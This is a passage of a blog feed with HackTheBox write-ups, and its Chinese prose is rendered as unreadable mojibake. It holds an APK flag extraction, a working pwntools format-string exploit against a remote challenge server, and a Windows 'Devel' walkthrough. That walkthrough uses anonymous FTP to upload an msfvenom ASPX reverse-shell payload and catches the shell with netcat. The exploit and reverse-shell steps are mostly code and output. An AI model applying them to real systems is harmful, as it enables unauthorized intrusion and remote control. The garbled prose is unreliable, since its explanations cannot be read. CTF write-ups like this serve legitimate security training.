æœªè¢«ç¯¡æ”¹ï¼Œä¿è­·æ‡‰ç”¨çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>å› ç‚ºæ˜¯å£“ç¸®æª”æˆ‘å€‘å¯ä»¥å…ˆåŸ·è¡Œï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip app-release.apk -d app_release</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œå°±å˜—è©¦ grep ä¸€äº›é—œéµå­—åƒæ˜¯ htb, hackthebox å°±çœ‹åˆ°ä¸‹é¢çš„è³‡è¨Šï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ grep -ri hackthebox                                                                                              â”€â•¯</span><br><span class="line">./assets/index.android.bundle:__d(<span class="keyword">function</span>(g,r,i,a,m,e,d)&#123;Object.defineProperty(e,<span class="string">&quot;__esModule&quot;</span>,&#123;value:!0&#125;),e.myConfig=void 0;var t=&#123;importantData:<span class="string">&quot;baNaNa&quot;</span>.toLowerCase(),apiUrl:<span class="string">&#x27;https://www.hackthebox.eu/&#x27;</span>,debug:<span class="string">&#x27;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&#x27;</span>&#125;;e.myConfig=t&#125;,400,[]);</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œçœ‹åˆ°ä¸€ä¸²å¯ç–‘çš„ base64ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â•°â”€ <span class="built_in">echo</span> <span class="string">&quot;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&quot;</span> | <span class="built_in">base64</span> -d                                              â”€â•¯</span><br><span class="line">HTB&#123;23m41n_c41m_4nd_d0n7_0v32234c7&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/react_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;é€™é¡Œæ˜¯ mobile çš„æŒ‘æˆ°ï¼Œçµ¦äº†ä¸€å€‹ .apkã€‚&lt;br&gt;.apkï¼ˆAndroid Packageï¼‰æ˜¯ä¸€ç¨®ç”¨æ–¼ An</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="android" scheme="https://kazma.tw/tags/android/"/>
    
    <category term="mobile" scheme="https://kazma.tw/tags/mobile/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges racecar Writeup</title>
    <link href="https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/"/>
    <id>https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/</id>
    <published>2024-10-28T13:32:58.318Z</published>
    <updated>2024-10-28T18:24:57.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>é¦–å…ˆé€™é¡Œæ˜¯ä¿è­·å…¨é–‹ï¼Œç„¶å¾Œæˆ‘å€‘å…ˆè·‘å€‹å¹¾æ¬¡æ¸¬è©¦ä¹‹å¾Œå°±å¯ä»¥å¾—åˆ°è³‡è¨Šæ˜¯å‰é¢çš„ Name è·Ÿ Nickname ä¸é‡è¦ï¼Œç„¶å¾Œæˆ‘å€‘é¸ç¬¬ä¸€å°è»Šè·‘ç¬¬äºŒå¼µåœ–ï¼Œæˆ–æ˜¯ç¬¬äºŒå°è»Šè·‘ç¬¬ä¸€å¼µåœ–å°±å¯ä»¥æ¯”è¼ƒå®¹æ˜“è´å¾—éŠæˆ²ã€‚éŠæˆ²å‹åˆ©å¾Œä»–æœƒå»æ‰“é–‹ flag.txt æ‰€ä»¥æˆ‘å€‘éœ€è¦å…ˆéš¨ä¾¿è¨­å®šä¸€å€‹ flag.txtï¼Œä½†æ˜¯ä»–åªæœƒæ‰“é–‹ä¸æœƒè¼¸å‡ºå‡ºä¾†ï¼Œä¸Ÿé€²å» ida å¾Œå°±æœƒçœ‹åˆ°é€™é‚Šåœ¨æœ€å¾Œå¾—çæ„Ÿè¨€çš„éƒ¨åˆ†æœ‰ä¸€å€‹ printf çš„ format string æ´å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( car_choice == <span class="number">1</span> &amp;&amp; (result = v9, v9 &lt; v11) || car_choice == <span class="number">2</span> &amp;&amp; (result = v9, v9 &gt; v11) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>);</span><br><span class="line">  coins += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">  speech = <span class="built_in">malloc</span>(<span class="number">369</span>);</span><br><span class="line">  flag_file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flag_file )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">105</span>, v5, <span class="string">&quot;\x1B[1;36m&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">44</span>, flag_file);</span><br><span class="line">  read(<span class="number">0</span>, speech, <span class="number">368</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(speech, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€é format string å°å‡º flag.txt çš„å…§å®¹ï¼Œç„¶å¾Œæˆ‘å€‘å¯ä»¥å…ˆé€é gdb ä¾†çœ‹ flag çš„ä½ç½®ç„¶å¾Œå¯«å‡ºæˆ‘å€‘çš„ exploit ä¾†å¹«æˆ‘å€‘è§£å‡º flagã€‚<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_gdb.png"                      alt="gdb"                ><br>æˆ‘å€‘æœ¬åœ°çš„ flag è¨­å®šæˆï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaaabbbb&quot;</span> &gt; flag.txt</span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥ä»–çš„ hex å€¼æœƒæ˜¯ 0x6161616162626262ï¼Œæ–¹ä¾¿æˆ‘å€‘è§€å¯Ÿï¼Œç„¶å¾Œæˆ‘åœ¨ gdb è¼¸å…¥äº† beef å¯ä»¥è§€å¯Ÿåˆ°ä»–å€‘çš„ä½ç½®é—œä¿‚ï¼Œç•¶ç„¶æˆ‘è¦ºå¾—ç›´æ¥å°å‡ºä¾†è§€å¯Ÿä¹Ÿæ˜¯ä¸€å€‹ä¸éŒ¯çš„æ–¹å¼ã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.48.79&quot;</span>, <span class="number">54556</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;@&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">25</span>):</span><br><span class="line">    p += <span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&quot;#&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Name:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Nickname:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, p)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">b&quot;#&quot;</span>).strip(<span class="string">b&quot;#&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&quot;0x&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss) // <span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i * <span class="number">2</span> : i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>åŸ·è¡Œçµæœï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python exploit.py</span><br><span class="line">[+] Opening connection to 94.237.48.79 on port 54556: Done</span><br><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;\x00e.7Ã¼CÃºÃ·</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;é¦–å…ˆé€™é¡Œæ˜¯ä¿è­·å…¨é–‹ï¼Œç„¶å¾Œæˆ‘å€‘å…ˆè·‘å€‹å¹¾æ¬¡æ¸¬è©¦ä¹‹å¾Œå°±å¯ä»¥å¾—åˆ°è³‡è¨Šæ˜¯å‰é¢çš„ Name è·Ÿ Nickname ä¸é‡è¦ï¼Œç„¶å¾Œæˆ‘</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmtstr" scheme="https://kazma.tw/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Devel Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/</id>
    <published>2024-10-27T11:27:24.862Z</published>
    <updated>2024-10-28T13:09:23.275Z</updated>
    
    <content type="html"><![CDATA[<p>å…ˆ <code>nmap</code> ä¸€ä¸‹ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ nmap -sV --script vuln 10.129.153.100</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:29 CDT</span><br><span class="line">Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.64% <span class="keyword">done</span>; ETC: 06:33 (0:00:01 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.153.100</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:microsoft:internet_information_services:7.5: </span><br><span class="line">|     PACKETSTORM:18058010.0https://vulners.com/packetstorm/PACKETSTORM:180580*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-10.0https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-*EXPLOIT*</span><br><span class="line">|     CVE-2010-397210.0https://vulners.com/cve/CVE-2010-3972</span><br><span class="line">|     SSV:201229.3https://vulners.com/seebug/SSV:20122*EXPLOIT*</span><br><span class="line">|     CVE-2010-27309.3https://vulners.com/cve/CVE-2010-2730</span><br><span class="line">|     SSV:201214.3https://vulners.com/seebug/SSV:20121*EXPLOIT*</span><br><span class="line">|     PACKETSTORM:1805844.3https://vulners.com/packetstorm/PACKETSTORM:180584*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-4.3https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-*EXPLOIT*</span><br><span class="line">|     CVE-2010-18994.3https://vulners.com/cve/CVE-2010-1899</span><br><span class="line">|     EDB-ID:158030.0https://vulners.com/exploitdb/EDB-ID:15803*EXPLOIT*</span><br><span class="line">|_    EDB-ID:151670.0https://vulners.com/exploitdb/EDB-ID:15167*EXPLOIT*</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 263.50 seconds</span></span><br></pre></td></tr></table></figure></div><p>ä»–æœ‰é–‹ ftpï¼Œæˆ‘å€‘å¯ä»¥ç”¨ <code>anonymous</code> ç™»å…¥çœ‹åˆ°ä¸‹é¢çš„è³‡è¨Šï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.153.100</span><br><span class="line">Connected to 10.129.153.100.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.153.100:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></div><p>é€éç€è¦½å™¨å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„ç•«é¢ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_ftp.png"                      alt="ftp"                ><br>é€™è¡¨ç¤ºäº† FTP è·Ÿ HTTP ä¼ºæœå™¨å…±äº«åŒä¸€å€‹æ ¹ç›®éŒ„ï¼Œé€™å•é¡Œå¾ˆå¤§ï¼Œå› ç‚ºæˆ‘å€‘å¯ä»¥é€éä¸Šå‚³æƒ¡æ„çš„æ–‡ä»¶ï¼Œç„¶å¾Œé€é http ä¾†è§¸ç™¼ï¼Œä¾‹å¦‚èªª reverse shellã€‚<br>é€™é‚Šæœƒç”¨åˆ° metasploit æ¡†æ¶ä¸­çš„ä¸€å€‹å·¥å…·ï¼Œå¯ä»¥ç”¨ä¾†ç”Ÿ payloadsã€‚<br>é€éä¸‹é¢çš„æŒ‡ä»¤æˆ‘å€‘å¯ä»¥çœ‹åˆ° <code>aspx</code> æ˜¯æ”¯æ´çš„æ ¼å¼ï¼ŒåŒæ™‚å¾å‰›å‰› FTP çš„è³‡è¨Šæˆ‘å€‘å¯ä»¥çœ‹åˆ°ä»–çš„ç›®éŒ„åç¨±æ‡‰è©²æ˜¯ ASP.NET ç”Ÿæˆçš„ï¼ŒåŒ…æ‹¬ <code>iisstart.htm</code> æ˜¯ä¸€å€‹æ¨™æº–çš„ IISï¼ˆInternet Information Servicesï¼‰ çš„èµ·å§‹é é¢ï¼Œå¯ä»¥å¾—çŸ¥ä¸Šé¢åœ¨é‹è¡Œ Microsoft IIS Web çš„ä¼ºæœå™¨ã€‚æ ¹æ“šä¸Šé¢çš„è³‡è¨Šæˆ‘å€‘æœƒç”¨ aspx ä¾†ç”Ÿæˆæˆ‘å€‘çš„ reverse shellã€‚</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfvenom --list formats</span><br><span class="line"></span><br><span class="line">Framework Executable Formats [--format &lt;value&gt;]</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    asp</span><br><span class="line">    aspx</span><br><span class="line">    aspx-exe</span><br><span class="line">    axis2</span><br><span class="line">    dll</span><br><span class="line">    ducky-script-psh</span><br><span class="line">    elf</span><br><span class="line">    elf-so</span><br><span class="line">    exe</span><br><span class="line">    exe-only</span><br><span class="line">    exe-service</span><br><span class="line">    exe-small</span><br><span class="line">    hta-psh</span><br><span class="line">    jar</span><br><span class="line">    jsp</span><br><span class="line">    loop-vbs</span><br><span class="line">    macho</span><br><span class="line">    msi</span><br><span class="line">    msi-nouac</span><br><span class="line">    osx-app</span><br><span class="line">    psh</span><br><span class="line">    psh-cmd</span><br><span class="line">    psh-net</span><br><span class="line">    psh-reflection</span><br><span class="line">    python-reflection</span><br><span class="line">    vba</span><br><span class="line">    vba-exe</span><br><span class="line">    vba-psh</span><br><span class="line">    vbs</span><br><span class="line">    war</span><br></pre></td></tr></table></figure></div><p>æˆ‘å€‘ç”¨ä¸‹é¢çš„æŒ‡ä»¤é¸ä¸€å€‹çœ‹èµ·ä¾†æœ€æ™®é€šçš„ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfvenom --list payloads | grep windows | grep reverse </span><br></pre></td></tr></table></figure></div><p>ç”Ÿ reverse shellï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfvenom -p windows/x64/shell/reverse_tcp -f aspx lhost=tun0 lport=4444 rhost=10.129.151.61 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of aspx file: 3675 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>ç”Ÿå¥½äº†ï¼æ¥è‘—æˆ‘å€‘æŠŠä»–ä¸Ÿä¸Šå» FTP </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.151.61</span><br><span class="line">Connected to 10.129.151.61.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.151.61:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; put rshell.aspx </span><br><span class="line"><span class="built_in">local</span>: rshell.aspx remote: rshell.aspx</span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |*************************************************************************************************|  3722       59.15 MiB/s    --:-- ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3722 bytes sent <span class="keyword">in</span> 00:00 (13.98 KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49158|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">10-28-24  01:39PM                 3722 rshell.aspx</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure></div><p>çµæœä¸Šé¢é‚£å€‹ payload å¥½åƒè¡Œä¸é€šï¼Œæˆ‘æ›æˆä¸‹é¢é€™å€‹å°±æˆåŠŸäº†ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=4444 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of aspx file: 2719 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>ç„¶å¾Œç€è¦½å™¨è¨ªå•å°±è§¸ç™¼ reverse shell äº†ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ nc -nlvp 4444 </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.63] from (UNKNOWN) [10.129.151.61] 49168</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span 